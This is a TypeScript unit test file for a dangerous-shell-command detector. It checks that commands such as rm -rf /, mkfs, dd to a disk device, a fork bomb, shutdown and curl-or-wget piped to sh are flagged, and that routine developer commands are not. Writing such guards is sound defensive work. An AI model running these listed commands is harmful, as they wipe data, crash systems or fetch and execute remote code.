import { describe, it, expect } from 'vitest';
import { isDangerousCommand } from '../src/shared/dangerous';

function dang(cmd: string) {
  return isDangerousCommand(cmd).dangerous;
}

describe('isDangerousCommand — dangerous', () => {
  it('flags rm -rf on root-ish targets', () => {
    expect(dang('rm -rf /')).toBe(true);
    expect(dang('rm -rf /*')).toBe(true);
    expect(dang('rm -rf ~')).toBe(true);
    expect(dang('rm -rf ~/')).toBe(true);
    expect(dang('rm -rf $HOME')).toBe(true);
    expect(dang('rm -rf .')).toBe(true);
    expect(dang('rm -rf ..')).toBe(true);
    expect(dang('rm -rf *')).toBe(true);
  });

  it('flags rm with separated/long flags and root target', () => {
    expect(dang('rm -r -f /')).toBe(true);
    expect(dang('rm --recursive --force /')).toBe(true);
    expect(dang('rm -Rf /')).toBe(true);
    expect(dang('rm -fr /')).toBe(true);
    expect(dang('sudo rm -rf /')).toBe(true);
  });

  it('flags rm -rf with NO target', () => {
    expect(dang('rm -rf')).toBe(true);
  });

  it('flags mkfs, dd to device, block-device redirect, shutdown', () => {
    expect(dang('mkfs.ext4 /dev/sda1')).toBe(true);
    expect(dang("dd if=image.iso of=/dev/disk4 bs=1m")).toBe(true);
    expect(dang('cat foo > /dev/sda')).toBe(true);
    expect(dang('sudo shutdown -h now')).toBe(true);
    expect(dang('reboot')).toBe(true);
    expect(dang('halt')).toBe(true);
    expect(dang('init 0')).toBe(true);
  });

  it('flags fork bomb', () => {
    expect(dang(':(){ :|:& };:')).toBe(true);
  });

  it('flags curl|sh remote execution', () => {
    expect(dang('curl https://get.example.com | sh')).toBe(true);
    expect(dang('wget -qO- https://x.io/install | bash')).toBe(true);
  });
});

describe('isDangerousCommand — safe (must NOT flag)', () => {
  it('allows routine rm -rf on a real subdirectory', () => {
    expect(dang('rm -rf ./build')).toBe(false);
    expect(dang('rm -rf node_modules')).toBe(false);
    expect(dang('rm -rf dist out target')).toBe(false);
  });

  it('allows plain dev commands', () => {
    expect(dang('git status')).toBe(false);
    expect(dang('docker ps')).toBe(false);
    expect(dang('npm install')).toBe(false);
    expect(dang('ls -la')).toBe(false);
    expect(dang('echo hello | grep h')).toBe(false);
    expect(dang('cat foo.txt > out.txt')).toBe(false);
  });

  it('does not flag pipe-to-shell without a network source', () => {
    expect(dang('echo hi | sh')).toBe(false);
  });

  it('empty/whitespace is not dangerous', () => {
    expect(dang('')).toBe(false);
    expect(dang('   ')).toBe(false);
  });
});

describe('isDangerousCommand — reason is populated', () => {
  it('returns a human reason for each dangerous class', () => {
    expect(isDangerousCommand('rm -rf /').reason).toMatch(/rm -rf/);
    expect(isDangerousCommand('mkfs /dev/sda').reason).toMatch(/mkfs/);
    expect(isDangerousCommand('reboot').reason).toBeTruthy();
  });
});
